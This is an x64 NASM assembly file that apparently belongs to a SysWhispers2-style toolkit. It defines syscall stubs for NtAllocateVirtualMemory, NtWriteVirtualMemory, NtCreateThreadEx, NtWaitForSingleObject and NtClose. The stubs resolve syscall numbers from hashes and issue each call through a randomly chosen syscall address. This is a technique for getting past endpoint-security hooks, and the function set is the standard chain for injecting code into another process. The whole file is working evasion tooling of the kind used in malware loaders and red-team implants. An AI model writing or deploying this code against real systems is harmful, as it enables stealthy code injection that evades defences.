[SECTION .data]
currentHash:    dd  0
returnAddress:  dq  0
syscallNumber:  dd  0
syscallAddress: dq  0

[SECTION .text]

BITS 64
DEFAULT REL

global NtAllocateVirtualMemory
global NtWriteVirtualMemory
global NtCreateThreadEx
global NtWaitForSingleObject
global NtClose

global WhisperMain
extern SW2_GetSyscallNumber
extern SW2_GetRandomSyscallAddress
    
WhisperMain:
    pop rax
    mov [rsp+ 8], rcx                   ; Save registers.
    mov [rsp+16], rdx
    mov [rsp+24], r8
    mov [rsp+32], r9
    sub rsp, 28h
    mov ecx, dword [currentHash]
    call SW2_GetSyscallNumber
    mov dword [syscallNumber], eax      ; Save the syscall number
    xor rcx, rcx
    call SW2_GetRandomSyscallAddress    ; Get a random syscall address
    mov qword [syscallAddress], rax     ; Save the random syscall address
    xor rax, rax
    mov eax, dword [syscallNumber]      ; Restore the syscall value
    add rsp, 28h
    mov rcx, [rsp+ 8]                   ; Restore registers.
    mov rdx, [rsp+16]
    mov r8, [rsp+24]
    mov r9, [rsp+32]
    mov r10, rcx
    pop qword [returnAddress]           ; Save the original return address
    call qword [syscallAddress]         ; Issue syscall
    push qword [returnAddress]          ; Restore the original return address
    ret

NtAllocateVirtualMemory:
    mov dword [currentHash], 0859D60F6h    ; Load function hash into global variable.
    call WhisperMain                       ; Resolve function hash into syscall number and make the call

NtWriteVirtualMemory:
    mov dword [currentHash], 0B135979Bh    ; Load function hash into global variable.
    call WhisperMain                       ; Resolve function hash into syscall number and make the call

NtCreateThreadEx:
    mov dword [currentHash], 050BC86E2h    ; Load function hash into global variable.
    call WhisperMain                       ; Resolve function hash into syscall number and make the call

NtWaitForSingleObject:
    mov dword [currentHash], 078550ABAh    ; Load function hash into global variable.
    call WhisperMain                       ; Resolve function hash into syscall number and make the call

NtClose:
    mov dword [currentHash], 0B6235FADh    ; Load function hash into global variable.
    call WhisperMain                       ; Resolve function hash into syscall number and make the call

